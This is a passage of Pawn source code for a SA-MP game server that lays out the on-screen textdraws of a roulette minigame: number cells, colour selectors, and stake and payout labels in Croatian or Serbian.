        PlayerTextDrawFont(playerid, RouletteTD[playerid][52], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][52], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][52], true);

        RouletteTD[playerid][53] = CreatePlayerTextDraw(playerid, 465.716827, 125.048095, "11");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][53], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][53], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][53], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][53], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][53], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][53], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][53], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][53], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][53], true);

        RouletteTD[playerid][54] = CreatePlayerTextDraw(playerid, 496.783447, 125.648078, "12");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][54], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][54], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][54], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][54], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][54], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][54], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][54], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][54], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][54], true);

        RouletteTD[playerid][55] = CreatePlayerTextDraw(playerid, 159.283477, 155.203689, "13");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][55], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][55], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][55], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][55], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][55], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][55], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][55], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][55], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][55], true);

        RouletteTD[playerid][56] = CreatePlayerTextDraw(playerid, 186.350158, 155.585235, "14");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][56], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][56], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][56], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][56], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][56], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][56], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][56], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][56], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][56], true);

        RouletteTD[playerid][57] = CreatePlayerTextDraw(playerid, 215.516876, 155.148239, "15");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][57], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][57], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][57], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][57], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][57], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][57], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][57], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][57], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][57], true);

        RouletteTD[playerid][58] = CreatePlayerTextDraw(playerid, 243.833572, 155.029739, "16");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][58], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][58], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][58], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][58], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][58], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][58], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][58], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][58], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][58], true);

        RouletteTD[playerid][59] = CreatePlayerTextDraw(playerid, 273.116912, 155.029739, "17");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][59], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][59], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][59], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][59], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][59], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][59], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][59], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][59], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][59], true);

        RouletteTD[playerid][60] = CreatePlayerTextDraw(playerid, 304.366882, 155.011245, "18");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][60], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][60], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][60], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][60], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][60], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][60], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][60], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][60], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][60], true);

        RouletteTD[playerid][61] = CreatePlayerTextDraw(playerid, 334.366790, 155.011245, "19");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][61], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][61], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][61], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][61], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][61], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][61], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][61], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][61], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][61], true);

        RouletteTD[playerid][62] = CreatePlayerTextDraw(playerid, 365.083526, 155.048233, "20");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][62], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][62], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][62], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][62], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][62], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][62], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][62], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][62], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][62], true);

        RouletteTD[playerid][63] = CreatePlayerTextDraw(playerid, 397.583526, 155.266738, "21");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][63], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][63], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][63], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][63], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][63], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][63], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][63], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][63], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][63], true);

        RouletteTD[playerid][64] = CreatePlayerTextDraw(playerid, 431.750152, 155.148239, "22");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][64], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][64], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][64], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][64], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][64], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][64], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][64], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][64], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][64], true);

        RouletteTD[playerid][65] = CreatePlayerTextDraw(playerid, 465.916870, 155.011215, "23");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][65], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][65], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][65], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][65], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][65], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][65], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][65], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][65], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][65], true);

        RouletteTD[playerid][66] = CreatePlayerTextDraw(playerid, 497.583526, 155.011215, "24");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][66], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][66], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][66], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][66], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][66], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][66], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][66], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][66], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][66], true);

        RouletteTD[playerid][67] = CreatePlayerTextDraw(playerid, 158.833404, 186.640853, "25");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][67], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][67], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][67], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][67], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][67], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][67], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][67], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][67], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][67], true);

        RouletteTD[playerid][68] = CreatePlayerTextDraw(playerid, 186.750106, 186.640853, "26");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][68], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][68], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][68], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][68], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][68], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][68], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][68], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][68], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][68], true);

        RouletteTD[playerid][69] = CreatePlayerTextDraw(playerid, 215.083450, 186.622360, "27");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][69], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][69], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][69], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][69], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][69], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][69], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][69], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][69], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][69], true);

        RouletteTD[playerid][70] = CreatePlayerTextDraw(playerid, 243.833465, 186.659347, "28");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][70], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][70], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][70], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][70], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][70], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][70], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][70], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][70], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][70], true);

        RouletteTD[playerid][71] = CreatePlayerTextDraw(playerid, 273.416748, 186.659362, "29");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][71], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][71], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][71], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][71], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][71], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][71], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][71], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][71], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][71], true);

        RouletteTD[playerid][72] = CreatePlayerTextDraw(playerid, 303.833465, 186.659393, "30");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][72], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][72], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][72], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][72], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][72], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][72], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][72], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][72], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][72], true);

        RouletteTD[playerid][73] = CreatePlayerTextDraw(playerid, 335.083312, 186.659393, "31");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][73], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][73], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][73], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][73], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][73], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][73], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][73], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][73], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][73], true);

        RouletteTD[playerid][74] = CreatePlayerTextDraw(playerid, 365.083374, 186.659393, "32");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][74], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][74], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][74], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][74], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][74], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][74], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][74], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][74], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][74], true);

        RouletteTD[playerid][75] = CreatePlayerTextDraw(playerid, 397.999938, 186.140884, "33");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][75], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][75], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][75], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][75], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][75], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][75], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][75], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][75], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][75], true);

        RouletteTD[playerid][76] = CreatePlayerTextDraw(playerid, 430.916595, 186.677902, "34");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][76], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][76], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][76], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][76], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][76], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][76], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][76], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][76], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][76], true);

        RouletteTD[playerid][77] = CreatePlayerTextDraw(playerid, 465.916656, 186.677902, "35");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][77], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][77], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][77], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][77], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][77], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][77], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][77], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][77], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][77], true);

        RouletteTD[playerid][78] = CreatePlayerTextDraw(playerid, 496.333312, 187.714935, "36");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][78], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][78], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][78], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][78], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][78], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][78], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][78], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][78], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][78], true);

        RouletteTD[playerid][79] = CreatePlayerTextDraw(playerid, 139.166625, 303.555786, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][79], 0.000000, 5.416663);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][79], 198.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][79], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][79], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][79], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][79], 230);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][79], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][79], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][79], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][79], 1);

        RouletteTD[playerid][80] = CreatePlayerTextDraw(playerid, 166.749969, 315.270629, "99");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][80], 0.570415, 2.948148);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][80], 0.000000, 80.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][80], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][80], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][80], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][80], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][80], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][80], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][80], true);

        RouletteTD[playerid][81] = CreatePlayerTextDraw(playerid, 145.833343, 221.629623, "Trenutni Ulog : 50$");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][81], 0.292499, 1.278517);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][81], 1388.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][81], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][81], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][81], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][81], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][81], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][81], 1);

        RouletteTD[playerid][82] = CreatePlayerTextDraw(playerid, 145.833358, 248.592529, "Odabrano : ~r~Crvena");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][82], 0.292499, 1.278517);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][82], 1388.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][82], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][82], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][82], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][82], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][82], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][82], 1);

        RouletteTD[playerid][83] = CreatePlayerTextDraw(playerid, 285.916595, 218.307510, "+");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][83], 0.489998, 1.905923);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][83], 10.0, 10.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][83], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][83], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][83], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][83], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][83], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][83], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][83], true);

        RouletteTD[playerid][84] = CreatePlayerTextDraw(playerid, 314.249847, 216.788909, "-");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][84], 0.489998, 1.905923);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][84], 10.0, 10.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][84], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][84], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][84], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][84], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][84], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][84], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][84], true);

        RouletteTD[playerid][85] = CreatePlayerTextDraw(playerid, 495.416412, 338.296356, "ZAVRTI");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][85], 0.414166, 1.620740);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][85], 15.0, 20.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][85], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][85], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][85], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][85], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][85], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][85], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][85], true);

        RouletteTD[playerid][86] = CreatePlayerTextDraw(playerid, 440.834014, 218.988555, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][86], 34.000000, 35.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][86], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][86], -16776961);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][86], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][86], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][86], 4);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][86], 0);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][86], true);

        RouletteTD[playerid][87] = CreatePlayerTextDraw(playerid, 479.166259, 219.496261, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][87], 34.000000, 35.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][87], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][87], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][87], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][87], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][87], 4);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][87], 0);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][87], true);

        RouletteTD[playerid][88] = CreatePlayerTextDraw(playerid, 145.833358, 274.000122, "Moguci Dobitak : ~g~100$");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][88], 0.292499, 1.278517);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][88], 1388.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][88], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][88], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][88], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][88], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][88], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][88], 1);

        RouletteTD[playerid][89] = CreatePlayerTextDraw(playerid, 398.749511, 219.496261, "ld_pool:ball");
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][89], 34.000000, 35.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][89], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][89], 16711935);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][89], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][89], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][89], 4);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][89], 0);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][89], true);

        RouletteTD[playerid][90] = CreatePlayerTextDraw(playerid, 292.083221, 264.666656, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][90], 0.000000, 2.583334);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][90], 333.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][90], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][90], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][90], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][90], 101322751);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][90], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][90], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][90], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][90], 1);

        RouletteTD[playerid][91] = CreatePlayerTextDraw(playerid, 345.833251, 264.666625, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][91], 0.000000, 2.583334);
